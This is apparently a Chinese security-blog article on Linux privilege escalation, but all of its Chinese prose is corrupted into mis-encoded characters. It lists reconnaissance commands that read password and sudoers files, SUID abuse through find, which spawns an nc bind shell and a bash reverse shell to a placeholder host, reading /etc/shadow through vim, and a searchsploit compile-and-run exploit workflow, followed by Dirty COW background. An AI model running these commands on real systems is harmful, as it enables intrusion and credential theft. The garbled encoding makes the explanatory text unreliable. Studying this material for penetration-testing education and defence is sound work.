> **åŸæ–‡é“¾æ¥**: https://mp.weixin.qq.com/s?__biz=MzkxMzMyNzMyMA==&mid=2247573935&idx=1&sn=2137aa80b33bfdad0e1602440a80ad6e

#  å†…ç½‘å®‰å…¨åŸºç¡€ä¹‹æƒé™æå‡  
ç‚¹å‡»å…³æ³¨ğŸ‘‰  é©¬å“¥ç½‘ç»œå®‰å…¨   2025-07-11 09:01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/UkV8WB2qYAk1nlByTOFiahZKGHekfZGC180aw53rHwCE1KXCFEyHULHRFVH3sTdiaibVFgTPic4UWScria3Vocb1TyQ/640?wx_fmt=png&from=appmsg "")  
## ç³»ç»Ÿææƒ  

```
ç³»ç»Ÿæ¼æ´ææƒä¸€èˆ¬å°±æ˜¯åˆ©ç”¨ç³»ç»Ÿè‡ªèº«ç¼ºé™·ï¼Œç”¨æ¥æå‡æƒé™ã€‚ä¸ºäº†ä½¿ç”¨æ–¹ä¾¿ï¼Œwindowså’Œlinuxç³»ç»Ÿå‡æœ‰ææƒç”¨çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚

Windowsçš„ææƒexpä¸€èˆ¬æ ¼å¼ä¸ºMS08067.exeï¼›
Linuxçš„ææƒexpä¸€èˆ¬æ ¼å¼ä¸º2.6.18-194æˆ–2.6.18.cã€‚

```

### linux  
#### ä¿¡æ¯æ”¶é›†  
###### æ‰‹åŠ¨  
##### 1ã€æ“ä½œç³»ç»Ÿä¿¡æ¯  

```
uname -a Â  Â  Â  Â  Â  Â  Â  Â æ‰“å°æ‰€æœ‰å¯ç”¨çš„ç³»ç»Ÿä¿¡æ¯
hostname Â  Â  Â  Â  Â  Â  Â  ç³»ç»Ÿä¸»æœºå

```

##### 2ã€ç”¨æˆ·ä¿¡æ¯  

```
cat /etc/passwd Â  Â  Â  Â  Â  Â  Â  Â åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç”¨æˆ·
cat /etc/group Â  Â  Â  Â  Â  Â  Â  Â  åˆ—å‡ºç³»ç»Ÿä¸Šçš„æ‰€æœ‰ç»„
whoami Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  æŸ¥çœ‹å½“å‰ç”¨æˆ·
id Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  å½“å‰ç”¨æˆ·ä¿¡æ¯
lastlog Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â æ‰€æœ‰ç”¨æˆ·ä¸Šæ¬¡ç™»å½•çš„ä¿¡æ¯
cat /etc/sudoers Â  Â  Â  Â  Â  Â  Â  æŸ¥çœ‹è¢«å…è®¸ä»¥rootèº«ä»½æ‰§è¡Œçš„ç”¨æˆ·
sudo -l Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â å½“å‰ç”¨æˆ·ä»¥rootèº«ä»½è¿›è¡Œæ‰§è¡Œæ“ä½œ

```

##### 3ã€ç¯å¢ƒä¿¡æ¯  

```
env/set Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â æ˜¾ç¤ºç¯å¢ƒå˜é‡
history Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  æ˜¾ç¤ºå½“å‰ç”¨æˆ·çš„å†å²å‘½ä»¤è®°å½•
pwd Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  æ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•
cat /etc/profile Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  æ˜¾ç¤ºé»˜è®¤ç³»ç»Ÿå˜é‡
cat /etc/shells Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â æ˜¾ç¤ºå¯ç”¨çš„shellrc

```

##### 4ã€è¿›ç¨‹ä¸æœåŠ¡  

```
ps aux Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â æ˜¾ç¤ºè¿›ç¨‹
cat /etc/services Â  Â  Â  Â  Â  Â  Â  Â  æŸ¥çœ‹æœåŠ¡

netstat -tanlp	æ˜¾ç¤ºå„ç§ç½‘ç»œæ¥å£çš„çŠ¶æ€ä¿¡æ¯
-tï¼šåªæ˜¾ç¤º TCP è¿æ¥ã€‚
-aï¼šæ˜¾ç¤ºæ‰€æœ‰è¿æ¥å’Œç›‘å¬ç«¯å£ï¼ˆé»˜è®¤æ˜¯åªæ˜¾ç¤ºç›‘å¬ç«¯å£ï¼‰ã€‚
-nï¼šç›´æ¥ä½¿ç”¨æ•°å­—åœ°å€å’Œç«¯å£ï¼Œè€Œä¸æ˜¯å°è¯•å°†åœ°å€è§£æä¸ºä¸»æœºåã€‚
-lï¼šæ˜¾ç¤ºç›‘å¬ç«¯å£ã€‚
-pï¼šæ˜¾ç¤ºæ¯ä¸ªè¿æ¥çš„è¿›ç¨‹ ID å’Œç¨‹åºåç§°ã€‚

```

##### 5ã€ç¨‹åº  

```
ls -alh /usr/bin/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â æ˜¾ç¤ºå½“å‰è¿è¡Œç¨‹åºä¿¡æ¯
ls -alh /sbin/ Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  æ˜¾ç¤ºå½“å‰è¿è¡Œç¨‹åºä¿¡æ¯
dpkg -l Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â æŸ¥çœ‹ç¨‹åºä¿¡æ¯

```

##### 6ã€è®¡åˆ’ä»»åŠ¡  

```
crontab -l Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡

```

##### 7ã€æ—¥å¿—ä¿¡æ¯  

```
/var/logä¸‹å„ä¸ªæ—¥å¿—æ–‡ä»¶
Apacheæ—¥å¿—æ–‡ä»¶ï¼šcat /etc/httpd/logs/access.log ï¼›cat /etc/httpd/logs/error_log
...

```

###### å·¥å…·æ”¶é›†  
##### 1ã€LinEnum  
  
LinEnumæ˜¯Linuxæšä¸¾åŠææƒæå‡æ£€æŸ¥å·¥å…·ï¼Œè¯¥å·¥å…·é™¤äº†RCEæ— æ³•æ”¶é›†ï¼Œå…¶ä»–ä¿¡æ¯éƒ½èƒ½æ”¶é›†ï¼Œä¸»è¦æœ‰ï¼šå†…æ ¸ã€ç³»ç»Ÿä¿¡æ¯ã€ç”¨æˆ·ä¿¡æ¯ã€ç¯å¢ƒã€ä½œä¸šã€ä»»åŠ¡ã€æœåŠ¡ã€webæœåŠ¡ç‰ˆæœ¬ã€é»˜è®¤å¯†ç æˆ–å¼±å£ä»¤ç­‰ã€‚  
  
ä¸‹è½½åœ°å€ï¼šLinEnum  
  
#####2ã€ Linuxprivchecker  
  
è¿™ä¸ªåŒæ ·ä¹Ÿæ˜¯å¯¹æœåŠ¡å™¨çš„ä¿¡æ¯è¿›è¡Œä¿¡æ¯æ”¶é›†çš„ä¸€ä¸ªè„šæœ¬ï¼Œä½†æ˜¯å¯èƒ½æ²¡æœ‰é¢œè‰²åŒºåˆ«æ¯”è¾ƒå•è°ƒï¼Œå¯ä»¥ç»“åˆå¤šä¸ªå·¥å…·è¿›è¡Œå¯¹æ¯”æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ä¿¡æ¯æ”¶é›†ç¼ºæ¼ã€‚è¿™ä¸ªè„šæœ¬éœ€è¦ä½¿ç”¨Pythonè¿›è¡Œæ‰§è¡Œã€‚  
  
ä¸‹è½½åœ°å€ï¼šLinuxprivchecker  
##### 3ã€linux-exploit-suggester  
  
è¿™ä¸ªè„šæœ¬ä¼šè¾“å‡ºæœåŠ¡å™¨åŸºæœ¬ä¿¡æ¯ï¼Œä¹Ÿä¼šè¾“å‡ºå¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼Œè¿˜åŒ…æ‹¬äº†expçš„ä¸‹è½½åœ°å€ï¼Œå¯ä»¥ä¸‹è½½å¯¹åº”çš„expè¿›è¡Œæµ‹è¯•ï¼Œè€Œä¸”æœ‰é¢œè‰²åŒºåˆ«è¯´æ˜ã€‚æ ¹æ®ç»™çš„expçš„ä¸‹è½½åœ°å€ä¸‹è½½è„šæœ¬ï¼Œæ¯ä¸€ä¸ªè„šæœ¬éƒ½ä¼šæœ‰å­˜åœ¨ç¼–è¯‘çš„å‘½ä»¤ï¼Œå¾ˆæœ‰å¯èƒ½ç›®æ ‡æœåŠ¡å™¨æ²¡æœ‰è¿™ä¸ªç¼–è¯‘ç¯å¢ƒï¼Œé‚£ä¹ˆåˆ™éœ€è¦åœ¨æœ¬åœ°è¿›è¡Œç¼–è¯‘ï¼Œç¼–è¯‘å®Œåå†å°†expä¸Šä¼ ä¸Šå»ï¼Œè€Œä¸”æ›´å¥½æ‰¾çš„æ˜¯åŒæ ·å‹å·çš„è¿›è¡Œç¼–è¯‘ï¼Œå‡å°‘å‡ºé”™å¯èƒ½ã€‚  
  
ä¸‹è½½è„šæœ¬ï¼šlinux-exploit-suggester  
#### 1ã€SUIDææƒ  
##### ä»€ä¹ˆæ˜¯suid  
  
SUIDï¼ˆSet User IDï¼‰æ˜¯ä¸€ç§æ–‡ä»¶å±æ€§ï¼Œå®ƒå…è®¸æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ï¼‰åœ¨æ‰§è¡Œæ—¶ä»¥æ–‡ä»¶æ‰€æœ‰è€…ï¼ˆrootï¼‰çš„æƒé™è¿è¡Œï¼Œè€Œä¸æ˜¯æ‰§è¡Œå®ƒçš„ç”¨æˆ·çš„æƒé™ã€‚è¿™ç§å±æ€§é€šå¸¸ç”¨äºå…è®¸æ™®é€šç”¨æˆ·ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡ŒæŸäº›æ“ä½œï¼Œè€Œæ— éœ€ç®¡ç†å‘˜å¯†ç ã€‚  
##### æ”¶é›†å…·æœ‰SUIDæƒé™çš„æ–‡ä»¶  

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;

```

  
ä»¥find / -perm -u=s -type f 2>/dev/nullä¸ºä¾‹å­ï¼š  

```
findï¼šè¿™æ˜¯ä¸€ä¸ªç”¨äºåœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æœç´¢æ–‡ä»¶çš„å·¥å…·ã€‚
/ï¼šæœç´¢çš„èµ·å§‹ç‚¹ï¼Œå³æ ¹ç›®å½•ã€‚
-perm -u=sï¼šè¿™æ˜¯åŒ¹é…çš„æƒé™æ¨¡å¼ã€‚-u=s ä¸“é—¨æŸ¥æ‰¾è®¾ç½®äº†ç”¨æˆ· SUID ä½çš„æ–‡ä»¶ã€‚
-type fï¼šè¿™æŒ‡å®šæœç´¢åº”è¯¥åªåŒ…æ‹¬æ–‡ä»¶ï¼ˆfï¼‰ã€‚
2>/dev/nullï¼šè¿™æ˜¯ä¸€ä¸ªé‡å®šå‘ï¼Œå°†ä»»ä½•é”™è¯¯æ¶ˆæ¯ï¼ˆ2>ï¼‰å‘é€åˆ° /dev/nullï¼Œä»è€Œæœ‰æ•ˆåœ°ä¸¢å¼ƒå®ƒä»¬ï¼Œå› æ­¤å‘½ä»¤ä¸ä¼šåœ¨ç»ˆç«¯è¾“å‡ºä»»ä½•é”™è¯¯æ¶ˆæ¯ã€‚

```

  
å°çŸ¥è¯†ç‚¹ï¼šShell è¾“å…¥/è¾“å‡ºé‡å®šå‘  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXqEfLCMAdKQZmDfMayMNd0ichXkWYFibU7LibkiaXRB1iazNxIb0lfSp8Oiag/640?wx_fmt=jpeg&from=appmsg "")  
##### find  
  
å¦‚æœFindå‘½ä»¤ä¹Ÿæ˜¯ä»¥Suidæƒé™è¿è¡Œçš„è¯ï¼Œåˆ™å°†é€šè¿‡findæ‰§è¡Œçš„æ‰€æœ‰å‘½ä»¤éƒ½ä¼šä»¥rootæƒé™æ‰§è¡Œã€‚  

```
#è¿›å…¥shellï¼š
find /etc/passwd -exec '/bin/sh' \;

#ncæ­£å‘è¿æ¥shellï¼š
find user -exec nc -lvp 4444 -e '/bin/sh' \;

#ncåå¼¹shellï¼š
find user -exec bash -c 'bash -i >& /dev/tcp/ip/4444 0>&1' \;

```

  
å¤§éƒ¨åˆ†Linuxæ“ä½œç³»ç»Ÿéƒ½å®‰è£…äº†netcatï¼Œå› æ­¤ä¹Ÿå¯ä»¥è¢«åˆ©ç”¨æ¥å°†æƒé™æå‡è‡³rootã€‚  

```
find pentestlab -exec netcat -lvp 5555 -e /bin/sh \;

```

  
è¿æ¥ä¸Šå»å°±ä¼šç›´æ¥è·å–åˆ°ä¸€ä¸ªRootæƒé™çš„shellã€‚  

```
netcat ip 5555
id
cat /etc/shadow

```

##### Vim  
  
Vimæ˜¯Linuxç¯å¢ƒä¸‹çš„ä¸€æ¬¾æ–‡ä»¶ç¼–è¾‘å™¨ã€‚ä½†æ˜¯ï¼Œå¦‚æœä»¥SUIDè¿è¡Œçš„è¯ï¼Œå®ƒä¼šç»§æ‰¿rootç”¨æˆ·çš„æƒé™ï¼Œå› æ­¤å¯ä»¥è¯»å–ç³»ç»Ÿä¸Šçš„æ‰€æœ‰æ–‡ä»¶ã€‚  

```
vim.tiny /etc/shadow

```

##### Bash  
  
ä»¥ä¸‹å‘½ä»¤å°†ä»¥rootæƒé™æ‰“å¼€ä¸€ä¸ªbash shellã€‚  

```
bash -p
bash-3.2# id
uid=1002(service) gid=1002(service) euid=0(root) groups=1002(serv

```

#### 2ã€å†…æ ¸æ¼æ´ææƒ  
  
tools:searchsploit ã€Linux_Exploit_Suggester  
  
é€šå¸¸æˆ‘ä»¬åœ¨æ‹¥æœ‰ä¸€ä¸ªwebshellçš„æ—¶å€™ï¼Œä¸€èˆ¬æƒé™éƒ½æ˜¯WEBå®¹å™¨æƒé™ï¼Œå¦‚åœ¨iiså°±æ˜¯iisç”¨æˆ·ç»„æƒé™ï¼Œåœ¨  
  
apacheå°±æ˜¯apacheæƒé™ï¼Œä¸€èˆ¬éƒ½æ˜¯æƒé™è¾ƒä½ï¼Œå‡å¯æ‰§è¡Œä¸€äº›æ™®é€šå‘½ä»¤ï¼Œå¦‚æŸ¥çœ‹å½“å‰ç”¨æˆ·ï¼Œç½‘ç»œä¿¡æ¯ï¼Œ  
  
ipä¿¡æ¯ç­‰ã€‚å¦‚æœæˆ‘æƒ³è¿›è¡Œå†…ç½‘æ¸—é€å°±å¿…é¡»å°†æƒé™ææƒåˆ°æœ€é«˜ï¼Œå¦‚ç³»ç»Ÿæƒé™è¶…çº§ç®¡ç†å‘˜æƒé™ã€‚  
##### 1. å†…æ ¸æº¢å‡ºææƒ  
1. å†…æ ¸æ¼æ´æ˜¯æœ€æœ‰æ•ˆçš„ææƒæ–¹æ³•ã€‚é€šæ€çš„å†…æ ¸æ¼æ´æ˜¯ååˆ†å°‘è§çš„ï¼Œå› è€Œæˆ‘ä»¬åº”è¯¥å…ˆå¯¹ç³»ç»Ÿç›¸å…³çš„ä¿¡æ¯è¿›è¡Œæ”¶é›†ï¼Œ å†æœç´¢å¯¹åº”çš„expè¿›è¡Œææƒæ”»å‡»  

```
//æŸ¥çœ‹å‘è¡Œç‰ˆæœ¬ï¼šè¿™äº›å‘½ä»¤ä½œç”¨éƒ½å·®ä¸å¤šï¼Œè·å–ä¸€äº›ä¿¡æ¯
cat /etc/issue
cat /etc/*-release
cat /etc/redhat-release
cat /proc/version
lsb_release -a
//æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬
uname -a

```

  
1. åˆ©ç”¨kaliè‡ªå¸¦çš„ searchsploit æ¥æœç´¢å¯¹åº”ç‰ˆæœ¬çš„expï¼ˆä¹Ÿå¯ä»¥ç›´æ¥å»å®˜ç½‘æ‰¾ï¼‰ï¼š  

```
searchspoit å‘è¡Œç‰ˆæœ¬å†…æ ¸ç‰ˆæœ¬
searchsploit -t Ubuntu 16.04 Â //-tä»…æœç´¢æ¼æ´æ ‡é¢˜
searchsploit -s Ubuntu 16.04 Â //
searchsploit -s Linux Kernel 4.15.0

```

  
1. æ‰¾åˆ°å¯åˆ©ç”¨çš„è„šæœ¬ä¹‹åï¼ŒæŸ¥çœ‹è·¯å¾„ä¿¡æ¯ï¼Œå¹¶å¤åˆ¶ä¸€ä¸ªåˆ°å½“å‰ç›®å½•ï¼ˆåˆ«æŸåäº†æ¼æ´åº“ä¸­åŸæ–‡ä»¶ï¼‰ï¼š  

```
searchsploit -x linux/local/47169.c
cp /usr/share/exploitdb/exploits/linux/local/47169.c Â ./

```

  
1. ä¹‹åå°±æ˜¯å°†è„šæœ¬ä¸Šä¼ åˆ°ç›®æ ‡æœº  
  
1. ç¼–è¯‘ï¼ŒåŠ æƒé™ï¼Œæ‰§è¡Œ  

```
gcc 47169.c -o exp
chmod +x exp
./exp

//idæµ‹è¯•æ˜¯å¦ææƒæˆåŠŸ
id

```

  
#### 3ã€ è„ç‰›ææƒCVE-2016-5195  
##### exp:  
  
gbonacini/CVE-2016-5195  
  
ç¼–è¯‘å¥½çš„å®‰å“å’Œlinux  
  
èŒƒå›´ï¼šlinuxå†…æ ¸=>2.6.22  

```
â— RHEL7 Linux x86_64
â— RHEL4ï¼ˆ4.4.7-16ï¼‰
â— Debian 7ï¼ˆâ€œwheelâ€ï¼‰
â— Ubuntu 14.04.1 LTS
â— Ubuntu 14.04.5 LTS
â— Ubuntu 16.04.1 LTS
â— Ubuntu 16.10
â— Linux Mint 17.2


é“¿é”µç‰ˆæœ¬ 4.0.0ï¼›
gcc ç‰ˆæœ¬ 6.2.0 20161005 (Ubuntu 6.2.0-5ubuntu12)
gcc ç‰ˆæœ¬ 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.1)
gcc ç‰ˆæœ¬ 4.8.5 20150623ï¼ˆçº¢å¸½ 4.8.5-4ï¼‰ï¼ˆGCCï¼‰ï¼›
gcc ç‰ˆæœ¬ 4.8.4 (Ubuntu 4.8.4);
gcc ç‰ˆæœ¬ 4.8.2 (Ubuntu 4.8.2-19ubuntu1)
gcc ç‰ˆæœ¬ 4.7.2 (Debian 4.7.2-5);
gcc ç‰ˆæœ¬ 4.4.7ï¼ˆå¸¦æœ‰â€œæ—§â€ç‰ˆæœ¬ï¼‰

```

##### æ¼æ´æˆå› ï¼š  
  
Linuxå†™æ—¶æ‹·è´æŠ€æœ¯ï¼ˆcopy-on-writeï¼‰  
  
åœ¨Linuxç³»ç»Ÿä¸­ï¼Œfork()ä¼šäº§ç”Ÿä¸€ä¸ªå’Œçˆ¶è¿›ç¨‹å®Œå…¨ç›¸åŒçš„å­è¿›ç¨‹ï¼Œä½†å­è¿›ç¨‹åœ¨æ­¤åå¤šä¼šexecç³»ç»Ÿè°ƒç”¨ï¼Œå‡ºäºæ•ˆç‡è€ƒè™‘ï¼ŒLinuxç³»ç»Ÿä¸­å¼•å…¥äº†â€œå†™æ—¶å¤åˆ¶â€æŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯åªæœ‰è¿›ç¨‹ç©ºé—´çš„å„æ®µçš„å†…å®¹è¦å‘ç”Ÿå˜åŒ–æ—¶ï¼Œæ‰ä¼šå°†çˆ¶è¿›ç¨‹çš„å†…å®¹å¤åˆ¶ä¸€ä»½ç»™å­è¿›ç¨‹ã€‚  
##### å‰ç½®çŸ¥è¯†  
###### Dirty COWæ¼æ´  
  
åŸæ–‡ç«   
  
Dirty COWæ¼æ´æ˜¯ä¸€ç§å‘ç”Ÿåœ¨å†™æ—¶å¤åˆ¶çš„ç«æ€æ¡ä»¶æ¼æ´ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwX589PyLwSXWHxRIX6mghHicAODzX1zQ6tVQvh4tyQOQibmicGpQVSpZMYg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
ç«æ€æ¡ä»¶æ˜¯æŒ‡ä¸€ä¸ªç³»ç»Ÿæˆ–è€…è¿›ç¨‹çš„è¾“å‡ºä¾èµ–äºä¸å—æ§åˆ¶çš„äº‹ä»¶å‡ºç°é¡ºåºæˆ–è€…å‡ºç°æ—¶æœºã€‚å³ä¸ºç”¨æˆ·Aåœ¨æ‰§è¡Œæ“ä½œAçš„æ—¶å€™ï¼ŒåŒæ—¶è¿›è¡Œæ“ä½œB,å¹¶ä¸”æ˜¯åŒæ—¶å‘ç”Ÿï¼Œåå°ç³»ç»Ÿåªåšä¸€æ¬¡åˆ¤æ–­ï¼Œä½†æ˜¯ä¸¤ä¸ªæ“ä½œéƒ½ä¼šè¿›è¡Œã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXVpVgszryHG4ibGiafibuVdaChhjLXVaKu8GIYZCR1odib86GS7ppTXxX3Q/640?wx_fmt=jpeg&from=appmsg "")  
  
ç«æ€æ¡ä»¶é€šå¸¸å‘ç”Ÿåœ¨å¤šä¸ªè¿›ç¨‹ï¼ˆçº¿ç¨‹ï¼‰åŒæ—¶è®¿é—®å’Œæ“ä½œç›¸åŒçš„æ•°æ®ä»¥åŠ æ‰§è¡Œç»“æœå–å†³äºç‰¹å®šçš„é¡ºåºè¿™ä¸¤ç§æƒ…å†µã€‚é‚£ä¹ˆå¦‚æœç‰¹æƒç¨‹åºå…·æœ‰ç«æ€æ¡ä»¶æ¼æ´çš„è¯ï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡å¯¹ä¸å¯æ§äº‹ä»¶æ–½åŠ å½±å“æ¥å½±å“ç‰¹æƒç¨‹åºçš„è¾“å‡ºã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXlUJD70G0O2HosYv9Na3QTvSRy6yNPJ0e8WibHwHevtRmSDs5pHOFMiaw/640?wx_fmt=jpeg&from=appmsg "")  
  
å†™æ—¶å¤åˆ¶æ˜¯ä¸€ç§å…è®¸ä¸åŒè¿›ç¨‹ä¸­çš„è™šæ‹Ÿå†…å­˜æ˜ å°„åˆ°ç›¸åŒç‰©ç†å†…å­˜é¡µé¢çš„æŠ€æœ¯ã€‚æ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨forkï¼ˆ**æ³¨ï¼š fork è°ƒç”¨ç”Ÿæˆçš„æ–°è¿›ç¨‹ä¸å…¶çˆ¶è¿›ç¨‹è°å…ˆæ‰§è¡Œä¸ä¸€å®šï¼Œå“ªä¸ªè¿›ç¨‹å…ˆæ‰§è¡Œè¦çœ‹ç³»ç»Ÿçš„è¿›ç¨‹è°ƒåº¦ç­–ç•¥**  
ï¼‰ç³»ç»Ÿè°ƒç”¨åˆ›å»ºå­è¿›ç¨‹ï¼Œé‚£ä¹ˆè¿™ä¸ªå­è¿›ç¨‹é€šè¿‡ä½¿é¡µè¡¨æ¡ç›®æŒ‡å‘ç›¸åŒçš„ç‰©ç†å†…å­˜æ¥å…±äº«çˆ¶è¿›ç¨‹å†…å­˜ï¼Œå½“ä»»ä½•è¿›ç¨‹è¯•å›¾å†™å…¥å†…å­˜æ—¶ï¼Œä¼šå¼•å‘å¼‚å¸¸ï¼ŒOSå°†ä¸ºå­è¿›ç¨‹åˆ†é…æ–°çš„ç‰©ç†å†…å­˜ï¼Œä»çˆ¶è¿›ç¨‹å¤åˆ¶å†…å®¹ï¼Œæ›´æ”¹æ¯ä¸ªè¿›ç¨‹çš„é¡µè¡¨ä½¿å®ƒæŒ‡å‘è‡ªå·±çš„ç§æœ‰å†…å­˜å‰¯æœ¬ï¼Œè¿™å°±æ˜¯å†™æ—¶å¤åˆ¶æŠ€æœ¯ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwX1ibEbf2GJiadAFEujCbDQ1RDqalaRlibibl876U2BtNyJZreGAw3fywScg/640?wx_fmt=jpeg&from=appmsg "")  
  
å†™æ—¶å¤åˆ¶æ‰§è¡Œè¿‡ç¨‹æ‰§è¡Œä¸‰ä¸ªé‡è¦æ­¥éª¤ï¼ŒåŒ…æ‹¬ï¼š**åˆ¶ä½œæ˜ å°„å†…å­˜çš„å‰¯æœ¬ï¼›æ›´æ–°é¡µè¡¨ï¼Œä½¿è™šæ‹Ÿå†…å­˜æŒ‡å‘æ–°åˆ›å»ºçš„ç‰©ç†åœ°å€ï¼›å†™å…¥å†…å­˜**  
ã€‚ç”±äºä¸‰ä¸ªæ­¥éª¤ä¸æ˜¯åŸå­æ€§çš„ï¼Œä¸€ä¸ªçº¿ç¨‹åœ¨æ‰§è¡Œè¿™ä¸‰ä¸ªæ­¥éª¤è¿‡ç¨‹ä¸­å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹ä¸­æ–­ï¼Œä»è€Œäº§ç”Ÿæ½œåœ¨çš„ç«æ€æ¡ä»¶ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXFRyz2GMb5pMBtUiceAPLHOcicqKQkoq6gO7Sw49YAesTgia4u4wKrujYQ/640?wx_fmt=jpeg&from=appmsg "")  
  
è¿™ä¸ªç³»ç»Ÿè°ƒç”¨åŒ…å«å›¾ä¸­çš„å‡ ä¸ªå‚æ•°ï¼šå‰ä¸¤ä¸ªå‚æ•°æ˜¯æ˜ å°„å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€å’Œå¤§å°ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯è¯»å†™æ–¹å¼ï¼Œå³æ˜¯å¦å¯è¯»æ˜¯å¦å¯å†™ï¼Œç¬¬å››ä¸ªå‚æ•°æŒ‡å®šæ˜ å°„çš„æ–¹å¼ï¼ŒåŒ…æ‹¬map_sharedå’Œmap_privateï¼Œmap_sharedæ˜¯æŒ‡å½“å¤šä¸ªçº¿ç¨‹å°†åŒä¸€ä¸ªæ–‡ä»¶æ˜ å°„åˆ°è‡ªå·±çš„è™šæ‹Ÿåœ°å€ä¸­ï¼Œå®ƒä»¬éƒ½å…±äº«åŒä¸€ä¸ªç‰©ç†å†…å­˜å—ï¼Œè¯´é€šä¿—ç‚¹å°±æ˜¯å…±äº«å†…å­˜ï¼Œmap_privateåˆ™æ˜¯å°†æ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹çš„ç§æœ‰å†…å­˜ï¼Œè¿™ä¸ªåä¸€é¡µé‡ç‚¹ä»‹ç»ï¼Œåä¸¤ä¸ªå‚æ•°æ˜¯æ˜ å°„çš„æ–‡ä»¶ä»¥åŠæ–‡ä»¶å†…åç§»ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXBiahdW7UqwduNMC2eNm5lDC5xxibP7vsOIY1x2Rs6p1Y5Y8LqJ31naOA/640?wx_fmt=jpeg&from=appmsg "")  
  
map_privateå‚æ•°æŒ‡å®šå°†æ–‡ä»¶æ˜ å°„åˆ°è¿›ç¨‹çš„ç§æœ‰å†…å­˜ã€‚ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œä¸¤ä¸ªè¿›ç¨‹å°†åŒä¸€ä¸ªæ–‡ä»¶æ˜ å°„åˆ°è‡ªå·±çš„è™šæ‹Ÿå†…å­˜åœ°å€ï¼Œå¦‚æœä¸¤ä¸ªæ–‡ä»¶éƒ½æ˜¯åªè¯»çš„ï¼Œé‚£ä¹ˆè™šæ‹Ÿå†…å­˜åœ°å€å°†æŒ‡å‘åŒä¸€ä¸ªç‰©ç†å†…å­˜å—ã€‚ä½†æ˜¯å¦‚æœä¸€ä¸ªè¿›ç¨‹è¯•å›¾å†™å…¥æ•°æ®ï¼Œå°±åƒå›¾ä¸­çš„è¿›ç¨‹2ï¼Œæ­¤æ—¶å°±ä¼šå‘ç”Ÿå†™æ—¶å¤åˆ¶ï¼Œå°†ç‰©ç†å†…å­˜å—å¤åˆ¶ä¸€ä¸ªå‰¯æœ¬ï¼Œç„¶åæ›´æ–°è¿›ç¨‹2çš„é¡µè¡¨æŒ‡å‘æ–°çš„å†…å­˜å—ï¼Œæœ€åå‘ç‰©ç†å†…å­˜å—çš„å‰¯æœ¬ä¸­å†™å…¥æ•°æ®ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7nIrJAgaibicMpPD36Actic82CdxrXpCBwXChfwuIxu9QGWKiaoqK6uDJXpLz0icMcz4SkxyFWlmROAAJvUOONicHTMA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
